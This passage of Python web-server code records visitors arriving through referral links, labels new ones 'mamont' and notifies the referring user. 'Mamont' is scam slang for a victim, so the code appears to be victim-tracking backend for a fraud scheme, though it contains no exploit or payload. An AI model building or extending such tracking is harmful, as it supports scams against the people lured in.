                """, (mamont_id, visitor_id, referrer_user_id, ref, datetime.now(timezone.utc).isoformat()))
                await db.commit()
                
                logger.info(f"Mamont created: mamont_id={mamont_id}, visitor_id={visitor_id}, referrer_user_id={referrer_user_id}")
                
                # Send mamont notification instead of generic visit notification
                background_tasks.add_task(notify_mamont_visit, referrer_user_id, mamont_id)
            else:
                # Mamont already exists, just record visit
                background_tasks.add_task(handle_visit_background, ref, client_ip, user_agent, visitor_id)
        else:
            # No owner found, just record visit
            background_tasks.add_task(handle_visit_background, ref, client_ip, user_agent, visitor_id)
    
    return {"status": "tracked"}

